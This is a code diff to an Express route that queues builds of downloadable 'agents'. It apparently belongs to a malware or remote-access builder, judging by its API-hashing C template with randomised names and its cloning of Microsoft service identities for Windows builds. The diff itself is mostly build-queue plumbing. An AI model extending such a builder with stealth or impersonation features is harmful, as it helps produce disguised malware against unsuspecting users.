@@ -973,8 +973,69 @@ DWORD GetAPIHash${randomId.substring(8, 16)}(LPSTR szApiName) {
 }
 
 // API Routes
+// Legacy endpoint - redirects to new build system for backward compatibility
 router.post('/generate-agent', protect, async (req, res) => {
     try {
+        const config = req.body;
+        const userId = req.user ? req.user.id : null;
+
+        if (!userId) {
+            return res.status(401).json({ success: false, error: 'User not authenticated' });
+        }
+
+        const AgentBuild = require('../models/AgentBuild');
+        const agentBuildService = require('../services/agentBuildService');
+        
+        // Generate unique agent ID
+        const agentId = msiBuilder.generateUniqueAgentId();
+        
+        // Create build record using new system
+        const build = new AgentBuild({
+            agentId: agentId,
+            name: config.agentName || `Agent_${agentId}`,
+            version: '1.0.0',
+            description: config.description || '',
+            config: config,
+            status: 'queued',
+            progress: 0,
+            createdBy: userId
+        });
+
+        await build.save();
+
+        // Emit queued event
+        agentBuildService.emitBuildEvent('build_queued', {
+            buildId: build._id.toString(),
+            agentId: build.agentId,
+            name: build.name
+        });
+
+        // Start generation asynchronously
+        agentBuildService.generateAgent(build._id, config).catch(error => {
+            console.error('Error in async agent generation:', error);
+        });
+
+        // Return legacy format for backward compatibility
+        const selectedService = config.platform === 'windows' ? 
+            Object.keys(microsoftServiceCloner.microsoftServices)[0] : null;
+        
+        res.json({
+            success: true,
+            agentId: agentId,
+            buildId: build._id.toString(),
+            status: 'queued',
+            message: 'Build queued. Use /api/agent/builds/:buildId to check status.',
+            // Legacy response fields for backward compatibility
+            clonedService: selectedService,
+            archiveDownloadUrl: `/api/agent/builds/${build._id}/download`,
+            timestamp: new Date().toISOString()
+        });
+        
+        return;
+        
+        // OLD CODE BELOW - kept for reference but not executed
+        /*
+        try {
         const config = req.body;
         
         // Generate unique agent ID
